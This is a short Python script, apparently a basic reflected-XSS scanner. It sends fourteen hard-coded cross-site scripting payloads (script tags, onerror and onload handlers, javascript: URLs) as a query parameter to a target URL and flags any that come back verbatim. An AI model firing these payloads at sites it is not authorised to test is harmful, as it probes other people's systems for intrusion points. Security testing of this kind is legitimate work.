import requests

def check_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",                  # Basic script alert payload
        "<img src='invalid-image' onerror='alert(1);'>",  # Image onerror payload
        "'';!--\"<XSS>=&{()}",                            # Malformed XSS payload
        "<svg/onload=alert('XSS')>",                      # SVG onload payload
        "<iframe src=\"javascript:alert('XSS')\"></iframe>", # Malformed iframe payload
        "<a href=\"javascript:alert('XSS')\">Click me</a>", # Anchor tag payload
        "<img src=x onerror=alert('XSS')>",               # Image src onerror payload
        "\"><script>alert('XSS')</script>",               # Injected script payload
        "><script>alert('XSS')</script>",                 # Script without surrounding tags
        "\"/><script>alert('XSS')</script>",              # Payload between tags
        "<BODY ONLOAD=alert('XSS')>",                     # Body onload payload
        "'><script>alert('XSS')</script>",                # Single quote payload
        "><img src=\"javascript:alert('XSS');\">",        # Image src javascript payload
        "%3Cscript%3Ealert('XSS')%3C/script%3E"           # URL-encoded script payload
        # Add more payloads here based on different XSS techniques
    ]

    vulnerabilities = []
    
    for payload in payloads:
        response = requests.get(url, params={"input": payload})
        
        if payload in response.text:
            vulnerabilities.append(payload)
    
    if vulnerabilities:
        message = "XSS vulnerabilities detected with payloads: {}".format(", ".join(vulnerabilities))
        severity = len(vulnerabilities) * 2  # Arbitrary severity calculation
        return message, severity
    
    return "No XSS vulnerabilities detected.", 1
    pass